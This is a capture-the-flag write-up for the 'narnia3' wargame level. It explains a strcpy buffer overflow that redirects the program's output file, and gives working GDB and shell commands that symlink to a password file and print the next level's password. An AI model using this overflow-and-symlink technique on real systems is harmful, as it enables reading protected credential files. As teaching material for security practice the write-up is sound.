# narnia3
slopey112 - 3/6/19

Let's open up the source code to get an idea of how this works.
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```
Looking it over, we can see that the binary is relatively simple; We open a file, and then we copy that file into `/dev/null`.

The vulnerability here is clearly visible; once again, just like `narnia2`, there is no bounds checking for the argument we are passing. Therefore, the vulnerability is a buffer overflow again. Can we overflow into `/dev/null`? Turns out we can. Let's open up GDB and try it out.
```assembly
0x0804850b <+0>:	push   ebp
0x0804850c <+1>:	mov    ebp,esp
0x0804850e <+3>:	sub    esp,0x58
0x08048511 <+6>:	mov    DWORD PTR [ebp-0x18],0x7665642f
0x08048518 <+13>:	mov    DWORD PTR [ebp-0x14],0x6c756e2f
0x0804851f <+20>:	mov    DWORD PTR [ebp-0x10],0x6c
0x08048526 <+27>:	mov    DWORD PTR [ebp-0xc],0x0
0x0804852d <+34>:	cmp    DWORD PTR [ebp+0x8],0x2
0x08048531 <+38>:	je     0x804854d <main+66>
0x08048533 <+40>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048536 <+43>:	mov    eax,DWORD PTR [eax]
0x08048538 <+45>:	push   eax
0x08048539 <+46>:	push   0x80486a0
0x0804853e <+51>:	call   0x8048390 <printf@plt>
0x08048543 <+56>:	add    esp,0x8
0x08048546 <+59>:	push   0xffffffff
0x08048548 <+61>:	call   0x80483b0 <exit@plt>
0x0804854d <+66>:	mov    eax,DWORD PTR [ebp+0xc]
0x08048550 <+69>:	add    eax,0x4
0x08048553 <+72>:	mov    eax,DWORD PTR [eax]
0x08048555 <+74>:	push   eax
0x08048556 <+75>:	lea    eax,[ebp-0x38]
0x08048559 <+78>:	push   eax
0x0804855a <+79>:	call   0x80483a0 <strcpy@plt>
0x0804855f <+84>:	add    esp,0x8
0x08048562 <+87>:	push   0x2
0x08048564 <+89>:	lea    eax,[ebp-0x18]
0x08048567 <+92>:	push   eax
0x08048568 <+93>:	call   0x80483c0 <open@plt>
...
```
Here's the break point up to the first `open` function. Take a look at the source code again. The real vulnerability lies in the `call` function; we are copying the first command line argument into a 32 byte buffer, and then trying to open that, and `/dev/null`. So we'll see what happens when we plug in something that is greater than 32 bytes.

Let's set a break point right at the last line in this snippet of code, and we'll see where we overflow into.
```
(gdb) b *0x08048568
Breakpoint 1 at 0x8048568
(gdb) r $(python -c "print '/tmp/'+'A'*27+'BBBB'")
Starting program: /narnia/narnia3 $(python -c "print '/tmp/'+'A'*27+'BBBB'")

Breakpoint 1, 0x08048568 in main ()
(gdb) x/s $eax
0xffffd680:	"BBBB"
```
When we take a look at the argument pushed into `open`, we can see that it is overflown; however, here's the key insight: we overflown the *old file*, not the new one; the old file was suppose to be `/dev/null`, but we were able to redirect it to a random file.

With this realization, the solution is understandable; we make a symbolically linked file to the flag, and we'll push that into the binary.
```
narnia3@narnia:~$ mkdir -p $(python -c "print '/tmp/'+'A'*27+'/tmp'")
narnia3@narnia:~$ cd $(python -c "print '/tmp/'+'A'*27+'/tmp'")
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ ln -s /etc/narnia_pass/narnia4 BBBB
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ touch /tmp/BBBB
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ chmod 777 /tmp/BBBB
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ /narnia/narnia3 "$(pwd)/BBBB"
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/BBBB to a safer place... (/tmp/BBBB)
narnia3@narnia:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp$ cat /tmp/BBBB
thaenohtai
```
